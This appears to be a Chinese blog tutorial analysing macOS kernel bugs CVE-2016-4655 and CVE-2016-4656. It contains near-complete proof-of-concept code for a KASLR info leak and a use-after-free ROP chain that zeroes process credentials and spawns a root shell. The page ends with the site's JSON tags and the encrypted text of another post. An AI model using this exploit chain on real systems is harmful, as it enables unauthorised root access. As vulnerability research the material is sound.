CVE-2016-4655-infoleak和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。 下面看漏洞点，回顾之前kOSSerializeNumber这个case内容 case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = OSNumber::withNumber(value, len); next += 2; break; 这里存在什么问题呢？这里没有检查OSNumber的长度，也就是说我们可以创建一个任意长度的OSNumber，进而在内核读取的时候越界，然后泄漏内核地址信息。 CVE-2016-4656-UAF漏洞UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。来看下漏洞点，下面的代码是序列化字典dic将OSString这个键转化为OSSymbol，见下 if (dict) { if (sym) { ... } else { sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) { sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; } ok = (sym != 0); } } 这里o-&gt;release()有什么问题呢?还记得objsArray吧，用来存储所有的对象，但是用setAtIndex这个宏来将所有的对象o存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面kOSSerializeObject中的switchcase。 case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; 此时之前存储在之前的objsArray的OSString已经free，而 o = objsArray[len]; o-&gt;retain();由对其进行了retain引用，好的一个完美的UAF漏洞。所以我们可以构造一个字典dic，其中OSString包含一些配对的值，然后序列化一个kOSSerializeObject引用对象，OSString将调用retain，但却是一个被释放的对象。 0x04 漏洞利用-PoC分析同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用 CVE-2016-4655-infoleak漏洞利用infoleak漏洞利用步骤： 构造一个包含过长的OSNumberdic字典 用这个序列化字典去设置userclient对象的属性 读回设置的OSNumber属性，造成infoleak 利用读取回来的内核地址信息计算KASLR 完整的代码。 uint64_t kslide_infoleak(void) { kern_return_t kr = 0, err = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; io_service_t serv = 0; io_connect_t conn = 0; io_iterator_t iter = 0; uint64_t kslide = 0; void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key + NUL byte in little-endian WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr == KERN_SUCCESS) { printf(&quot;(+) Dictionary is valid! Spawning user client...\\n&quot;); } else return -1; serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;)); kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn); if (kr == KERN_SUCCESS) { printf(&quot;(+) UC successfully spawned! Leaking bytes...\\n&quot;); } else return -1; IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter); io_object_t object = IOIteratorNext(iter); char buf[0x200] = {0}; mach_msg_type_number_t bufCnt = 0x200; kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt); if (kr == KERN_SUCCESS) { printf(&quot;(+) Done! Calculating KASLR slide...\\n&quot;); } else return -1; #if 0 for (uint32_t k = 0; k &lt; 128; k += 8) { printf(&quot;%#llx\\n&quot;, *(uint64_t *)(buf + k)); } #endif uint64_t hardcoded_ret_addr = 0xffffff80003934bf; kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr; printf(&quot;(i) KASLR slide is %#016llx\\n&quot;, kslide); return kslide; } 构造字典看下面这段代码 void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) 这里的WRITE_IN这个宏只是为了方便我们将数据填入内存之中 xml的字典格式 &lt;dict&gt; &lt;symbol&gt;AAA&lt;/symbol&gt; &lt;number size=0x200&gt;0x4141414141414141&lt;/number&gt; &lt;/dict&gt; 对应的代码 WRITE_IN(dict, (0x000000d3)); // 头部签名 WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // 包含两个元素的字典 WRITE_IN(dict, (kOSSerializeSymbol | 4)); // 长度为3的symbol WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key键 WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); //0x200大小的number WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); //实际8字节的number 利用io_service_get_matching_services_bin测试我们的dic是否有效 host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr == KERN_SUCCESS) { printf(&quot;(+) Dictionary is valid! Spawning user client...\\n&quot;); } else return -1; 若kr == KERN_SUCCESS则我们的dic则为有效 生成UserClient设定属性我们需要一个UserClient用来和内核通信，所以使用io_service_open_extended来产生一个相关服务的UserClient，这里的服务并不重要 serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;)); kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn); if (kr == KERN_SUCCESS) { printf(&quot;(+) UC successfully spawned! Leaking bytes...\\n&quot;); } else return -1; 首先我们通过IOServiceGetMatchingService去从IORegistry里匹配一个特定服务，然后通过io_service_open_extended让可以设置其属性并打开一个服务即隐式产生UserClient接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代IORegistry找到刚刚创建的UserClient。 IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter); io_object_t object = IOIteratorNext(iter); 先通过serv端口创建io_iterator_t，我们的UserClient在serv创建之后，所以拿到iter后迭代一次即为我们的UserClient，现在就可以读取其属性并触发info-leak。 读取属性，触发info-leakchar buf[0x200] = {0}; mach_msg_type_number_t bufCnt = 0x200; kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt); if (kr == KERN_SUCCESS) { printf(&quot;(+) Done! Calculating KASLR slide...\\n&quot;); } else return -1; 通过io_registry_entry_get_property_bytes我们可以获取到原始字节，存在buf中，我们打印其值 for (uint32_t k = 0; k &lt; 128; k += 8) { printf(&quot;%#llx\\n&quot;, *(uint64_t *)(buf + k)); } 对应输出： 0x4141414141414141 // 有效的number 0xffffff8033c66284 // 0xffffff8035b5d800 // 0x4 // 其他数据或返回地址 0xffffff803506d5a0 // 0xffffff8033c662b4 // 0xffffff818d2b3e30 // 0xffffff80037934bf // 函数返回地址 ... 我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数这里实际读取的代码位于is_io_registry_entry_get_property_bytes函数，即io_registry_entry_get_property_bytes调用了 is_io_registry_entry_get_property_bytes。 is_io_registry_entry_get_property_bytes源代码 /* Routine io_registry_entry_get_property */ kern_return_t is_io_registry_entry_get_property_bytes( io_object_t registry_entry, io_name_t property_name, io_struct_inband_t buf, mach_msg_type_number_t *dataCnt ) { OSObject * obj; OSData * data; OSString * str; OSBoolean * boo; OSNumber * off; UInt64 offsetBytes; unsigned int len = 0; const void * bytes = 0; IOReturn ret = kIOReturnSuccess; CHECK( IORegistryEntry, registry_entry, entry ); #if CONFIG_MACF if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name)) return kIOReturnNotPermitted; #endif obj = entry-&gt;copyProperty(property_name); if( !obj) return( kIOReturnNoResources ); // One day OSData will be a common container base class // until then... if( (data = OSDynamicCast( OSData, obj ))) { len = data-&gt;getLength(); bytes = data-&gt;getBytesNoCopy(); } else if( (str = OSDynamicCast( OSString, obj ))) { len = str-&gt;getLength() + 1; bytes = str-&gt;getCStringNoCopy(); } else if( (boo = OSDynamicCast( OSBoolean, obj ))) { len = boo-&gt;isTrue() ? sizeof(&quot;Yes&quot;) : sizeof(&quot;No&quot;); bytes = boo-&gt;isTrue() ? &quot;Yes&quot; : &quot;No&quot;; } else if( (off = OSDynamicCast( OSNumber, obj ))) { /* j: reading an OSNumber */ offsetBytes = off-&gt;unsigned64BitValue(); len = off-&gt;numberOfBytes(); bytes = &amp;offsetBytes; #ifdef __BIG_ENDIAN__ bytes = (const void *) (((UInt32) bytes) + (sizeof( UInt64) - len)); #endif } else ret = kIOReturnBadArgument; if( bytes) { if( *dataCnt &lt; len) ret = kIOReturnIPCError; else { *dataCnt = len; bcopy( bytes, buf, len ); } } obj-&gt;release(); return( ret ); } 下面代码表示正在读取OSNumber， ... else if( (off = OSDynamicCast( OSNumber, obj ))) { offsetBytes = off-&gt;unsigned64BitValue(); /* j: the offsetBytes variable is allocated on the stack */ len = off-&gt;numberOfBytes(); /* j: this reads out our malformed length, 0x200 */ bytes = &amp;offsetBytes; /* j: bytes* ptr points to a stack variable */ ... } ... 然后 if( bytes) { if( *dataCnt &lt; len) ret = kIOReturnIPCError; else { *dataCnt = len; bcopy( bytes, buf, len ); /* j: this leaks data from the stack */ } } 执行bcopy时，从bytes里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值 计算内核偏移将/System/Library/Kernels/kernel拖入hopper，搜索is_io_registry_entry_get_property_bytes，如下图 然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值 0xffffff80037934bf - 0xffffff80003934bf = 0x3400000 也就是下面这段代码所示： uint64_t hardcoded_ret_addr = 0xffffff80003934bf; kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr; printf(&quot;(i) KASLR slide is %#016llx\\n&quot;, kslide); 现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！ CVE-2016-4656-UAF漏洞利用XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步深入理解Linux堆分配器-DLMalloc这篇分析。那么下面要做的就是如何构造下一个分配的对象，这里我们用OSData因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次o-&gt;retain引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步详解virtual table简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。下面看我们的步骤： 制作一个二进制字典，释放OSString并重新分配OSData。 Map NULL 放置stack pivot在偏移0x20到NULL页面 将一个小的传输链0x0放置在NULL页面中（这将传递执行到主链） 触发漏洞 提升权限，生成shell 下面看完整的Poc代码： void use_after_free(void) { kern_return_t kr = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; /* craft the dictionary */ printf(&quot;(i) Crafting dictionary...\\n&quot;); void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries WRITE_IN(dict, (kOSSerializeString | 4)); // string &#39;AAA&#39;, will get freed WRITE_IN(dict, (0x00414141)); WRITE_IN(dict, (kOSSerializeBoolean | 1)); // bool, true WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol &#39;BBB&#39; WRITE_IN(dict, (0x00424242)); WRITE_IN(dict, (kOSSerializeData | 32)); // data (0x00 * 32) WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol &#39;CCC&#39; WRITE_IN(dict, (0x00434343)); WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1)); // ref to object 1 (OSString) /* map the NULL page */ mach_vm_address_t null_map = 0; vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE); kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0); if (kr != KERN_SUCCESS) return; macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK); printf(&quot;(i) Leaking kslide...\\n&quot;); SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide /* set the stack pivot at 0x20 */ *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot /* build ROP chain */ printf(&quot;(i) Building ROP chain...\\n&quot;); rop_chain_t *chain = calloc(1, sizeof(rop_chain_t)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;)); /* chain transfer, will redirect execution flow from 0x0 to our main chain above */ uint64_t *transfer = (uint64_t *)0x0; transfer[0] = ROP_POP_RSP(map); transfer[1] = (uint64_t)chain-&gt;chain; /* trigger */ printf(&quot;(+) All done! Triggering the bug!\\n&quot;); host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr != KERN_SUCCESS) return; } 这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到下面一步一步分析 构造字典将如下构造 &lt;dict&gt; &lt;string&gt;AAA&lt;/string&gt; &lt;boolean&gt;true&lt;/boolean&gt; &lt;symbol&gt;BBB&lt;/symbol&gt; &lt;data&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &lt;/data&gt; &lt;symbol&gt;CCC&lt;/symbol&gt; &lt;reference&gt;1&lt;/reference&gt; &lt;!--引用第一个string元素--&gt; &lt;/dict&gt; 当执行retain时就会以0x20的偏移量地址读取，也就是rip其值将为0x20可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术 Map NULL苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。 mach_vm_address_t null_map = 0; vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE); kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0); if (kr != KERN_SUCCESS) return; 这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志 Pivoting stack和ROP链下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip首先将rip转移到0x20处 *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot 然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。 uint64_t *transfer = (uint64_t *)0x0; transfer[0] = ROP_POP_RSP(map); transfer[1] = (uint64_t)chain-&gt;chain; 接着rip转移到main-&gt;chain，和前面一样ROP链一样，不过主链是为了达到提权的目的。主链的代码 rop_chain_t *chain = calloc(1, sizeof(rop_chain_t)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;)); 主链的执行过程其实原理并不复杂： chain prototype: proc = current_proc();//找到当前程序的credentials结构 ucred = proc_ucred(proc); posix_cred = posix_cred_get(ucred); bzero(posix_cred, (sizeof(int) * 3));//将组id设为0即提权为root thread_exception_return();//thread_exception_return只是让我们离开内核区域而不会panic，通常用于从内核陷阱返回。 接下来的代码和之前一样，测试我们构造的dic是否有效： host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr != KERN_SUCCESS) return; 最后如果一切都顺利，我们检查当前进程getuid是否等于0，如果是就提权root成功，然后调用system(&quot;/bin/bash&quot;)弹出一个shell！ if (getuid() == 0) { puts(&quot;(+) got r00t!&quot;); system(&quot;/bin/bash&quot;); } 测试： 0x04 总结终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的黄大大和杨君大大，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，UAF，Vtable等等等等。也印证了今天在微博上看到教主的那句话：学好书不求甚解，爱技术不论用处，当我去用之前所学去理解一个个知识点的时候才体会到后半句：每有会意便欣然忘食 PoC完整的Poc代码在这里 特别感谢 mrh –这是黄大大的分析，黄大大是一个特别严谨细致的人，分析文章使人豁然开朗 jndok’s blog –本文大多基于jndok的分析，可以去看看原文的分析 杨君的小黑屋–杨君大大特别有耐心，执着于技术，乐于分享技术 参考1.User Client Info.txt2.Attacking-The-XNU-Kernal-In-El-Capitain3.Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-18284.Defiling-Mac-OS-X-Ruxcon5.Apple Mac OSX Kernel - Exploitable NULL Dereference in CoreCaptureResponder Due to Unchecked Return Value6.认真分析mmap：是什么 为什么 怎么用7.Resolving kernel symbols OSUnserializeBinary源码 OSObject * OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString) { OSObject ** objsArray; uint32_t objsCapacity; uint32_t objsIdx; OSObject ** stackArray; uint32_t stackCapacity; uint32_t stackIdx; OSObject * result; OSObject * parent; OSDictionary * dict; OSArray * array; OSSet * set; OSDictionary * newDict; OSArray * newArray; OSSet * newSet; OSObject * o; OSSymbol * sym; size_t bufferPos; const uint32_t * next; uint32_t key, len, wordLen; bool end, newCollect, isRef; unsigned long long value; bool ok; if (errorString) *errorString = 0; if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL); if (3 &amp; ((uintptr_t) buffer)) return (NULL); if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL); bufferPos = sizeof(kOSSerializeBinarySignature); next = (typeof(next)) (((uintptr_t) buffer) + bufferPos); DEBG(&quot;---------OSUnserializeBinary(%p)\\n&quot;, buffer); objsArray = stackArray = NULL; objsIdx = objsCapacity = 0; stackIdx = stackCapacity = 0; result = 0; parent = 0; dict = 0; array = 0; set = 0; sym = 0; ok = true; while (ok) { bufferPos += sizeof(*next); if (!(ok = (bufferPos &lt;= bufferSize))) break; key = *next++; len = (key &amp; kOSSerializeDataMask); wordLen = (len + 3) &gt;&gt; 2; end = (0 != (kOSSerializeEndCollecton &amp; key)); DEBG(&quot;key 0x%08x: 0x%04x, %d\\n&quot;, key, len, end); newCollect = isRef = false; o = 0; newDict = 0; newArray = 0; newSet = 0; switch (kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeArray: o = newArray = OSArray::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeSet: o = newSet = OSSet::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = OSNumber::withNumber(value, len); next += 2; break; case kOSSerializeSymbol: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; if (0 != ((const char *)next)[len-1]) break; o = (OSObject *) OSSymbol::withCString((const char *) next); next += wordLen; break; case kOSSerializeString: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSString::withStringOfLength((const char *) next, len); next += wordLen; break; case kOSSerializeData: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSData::withBytes(next, len); next += wordLen; break; case kOSSerializeBoolean: o = (len ? kOSBooleanTrue : kOSBooleanFalse); break; default: break; } if (!(ok = (o != 0))) break; if (!isRef) { setAtIndex(objs, objsIdx, o); if (!ok) break; objsIdx++; } if (dict) { if (sym) { DEBG(&quot;%s = %s\\n&quot;, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName()); if (o != dict) ok = dict-&gt;setObject(sym, o); o-&gt;release(); sym-&gt;release(); sym = 0; } else { sym = OSDynamicCast(OSSymbol, o); ok = (sym != 0); } } else if (array) { ok = array-&gt;setObject(o); o-&gt;release(); } else if (set) { ok = set-&gt;setObject(o); o-&gt;release(); } else { assert(!parent); result = o; } if (!ok) break; if (newCollect) { if (!end) { stackIdx++; setAtIndex(stack, stackIdx, parent); if (!ok) break; } DEBG(&quot;++stack[%d] %p\\n&quot;, stackIdx, parent); parent = o; dict = newDict; array = newArray; set = newSet; end = false; } if (end) { if (!stackIdx) break; parent = stackArray[stackIdx]; DEBG(&quot;--stack[%d] %p\\n&quot;, stackIdx, parent); stackIdx--; set = 0; dict = 0; array = 0; if (!(dict = OSDynamicCast(OSDictionary, parent))) { if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent))); } } } DEBG(&quot;ret %p\\n&quot;, result); if (objsCapacity) kfree(objsArray, objsCapacity * sizeof(*objsArray)); if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray)); if (!ok &amp;&amp; result) { result-&gt;release(); result = 0; } return (result); }","tags":[{"name":"Pegasus","slug":"Pegasus","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Pegasus/"},{"name":"cve","slug":"cve","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/cve/"},{"name":"CVE-2016-4655","slug":"CVE-2016-4655","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4655/"},{"name":"CVE-2016-4656","slug":"CVE-2016-4656","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4656/"},{"name":"PoC","slug":"PoC","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/PoC/"}]},{"title":"PE格式分析","date":"2017-04-29T08:41:18.000Z","path":"2017/04/29/PE格式分析/PE格式分析/","text":"Need password to decrypt! Incorrect Password! No content to display! U2FsdGVkX18w83k5ZhFG/aZlajYZBw2jSLhFOrFN6ced2+1IM790cH/SnNwFrcgKbwjzjXerkhJTNySQCFUbV/WxWUu83Ha70F9oZcR3D7Q1KEsp7zXiU27EXX6AYQZldQ3fMoo3NBI1KJSsbVPpUsnphb8v9lALX8xZVjZAC/MqGHY4rzx4R6IjVCpDGwikgdmZqymG2hpbVbDjbB7LPgTNFfmVW4th+ERs/F8hscq7fNqIbJDfZvApgz7o319OP4f8p3o3dhsml8kDp7R5eS6BG02RZvtQxg+STAS5edvVg9dNtjwZyqkgfUx+WOjYZl5dK4XB1KYPu+iuL08WgEOwCV6XPubL+RWqNn/JnWOxCPSz/1w8cmGdzaBK6xCJKXrqHWsEU1aCf0Y5HVyPWAI5LFHn9QtXqb4qHufBXSKG0KHEsP27i+oRPBtjsuGWM1bzhoLgGQLmht1KxQiTrU8mNajzw7K2uy4hqJS/TiYUMux6l+fX4xatpcZJTHyWmQ9KvnFgHx+NgsuTJ+ABaInice6pi6k97I2OLFin1UrFf/w+5ZEYcmwgkUF7SL2Z+jevnOKb28Nk9rA16EzsauLigZeH2vOh5gWUQRhupCsc86wNrw0nN11NFYEmcyVgdBgaDTLbxrDHeUW8Y8DwuSEBvurG3EA3LYLfbcqBNfS4TQA8LDZpOpT83A7irk4JbGahW0mvMX4MadMMAmxfOoCmlfZyImaSVpXOTyJHV+qu6SRXGGRJ9lcqtN9OfCK+Io046ZQZ22QGYlxsUxWPOOSXS4yM14sikBGY89gmWiKxh9AbtqTcW+6UUI+ORRMktgEPRTn3UA0NdknDj/OiCVhDcBLi9da70IVLJ7iT1vgVkQvIHPY9DBMg1hJqiTqVnMPyALIaotDn4HsSdLD2iAE/bhQS7P11/e376qljEFyZfXzimVaZQi+DwbTKlHh2E+uuRg/sVvynJtw5w4TR1i2MWqoJc6b8TW1lCxzAautBEExou6dZ0JMfgrtMVLDtgs9lFsncrzvkCxscrJEu3XSpth4S0bm7rPXgI7LWtDmImTm4ulGEEr7kJwVtFkKAZT3oyoQ1Bybd1zRr/AvqUXbDTF3cJ+sdUjPIkubWhQ1InTezAmZ75lHgy7Hr2eElqNdfwMFWYbby1tMV2qM7iRL7ZDIb8pv+HW8LHAPPVsOXqp3ffMLgTmaXNzfZQub54AQQ9pN9Jm69Y6UIlaGAsq5L8Ne6xYZUSYtPTqiGv2NiEh0Z97RRT4O0KyXeV7XLhMSwtBInIk0ExZpAMR/ZS5FMkOapbgzGnWiIJS/7yuJLjQE1AzrvDOQLCiTg407BiCqE2VegygI/SwilM2dUQC1h0JVRYgkVFxs4EWY4XtP5gkR5BAZFx02SThDjlo9yT/Fuhr77VqC4y6C5jFEbl7iYU/zdVQdp5yHoIz+2nocCWMVFe1HlNYpP1Wu8kd/orD2Zzy3xAWWEWxhvgpnemYzfmZZiy7uu5cox63f/6UpN4rmf7meB2RTm9+qyimgw4ag/Vgxqk3lIIdQJH3NE5iLH2hfpzhocNLCELS6G7RWNtX/ZgHx7gQi956AJ2X3blyIY0kaqOj/qKr/YKW7WZqyPTZLApjeKP/mPkTB6038KmZmltGB4b6cNwKRSCph1gdXEmHCkgwLzDs53h44Qj8qSFDuYM/pCY5x7C6o+vRWYCLHZUT54bb/tlj8pQJnyrZECF8Cd/hUY8MxuIzCKmF26WCxcbPMmd45l9jXZFKygpFrfm+mwte1nUGF/h0aJuXVx2E+H+Y4gr3K5RsbInZFrxKf/0FbkNMmWFjRXDBBP8xb3Z9a1HTudXbyO5TdJu6UBbIT1xtM7mLHsgdzgMHwVoK/1eJ//UMcrRoBcp94dJz71zrBJvyEQ2+qkQ5yHQ+iAOXvsKPEmTFwU6l8vhOYZ/cgymROcG0/CUitLPUf1KcZQQXfUJ6SEEru0w+0wZu3x9DRLvNNFrkZJEcbA6mjoStIXLdbTzvEc2wwYA6GfYHH11QlG5GupMHYOAft8Mf3kDi5avHCVKhJV2+OWFO+93ZGBTHFg+azexRtTpQm2gPRyPbJYyPfoLJYcT5tDJZ9M4EuBanh52Ca/8HR8bldO0GJcN6hZK8/jB+suhdPOetKXRW3LTY9GGl6YaiMreKbmgsD1AyiF7eEV+txu4xRQ02m5NGm23OC/z4WDMxzGa0rzbq3xuRKnz2djefTq9k9NCOhCvFPtzXrHQk3PX2Yc73SV8fpZ4H8iX0GUOMWd3N0DlEUgriR179anbsOf6iqlutNzN/mVYBOcUynZ8BF2bBXGjhiHrPW3zQi45JXZBA5IVyOwp4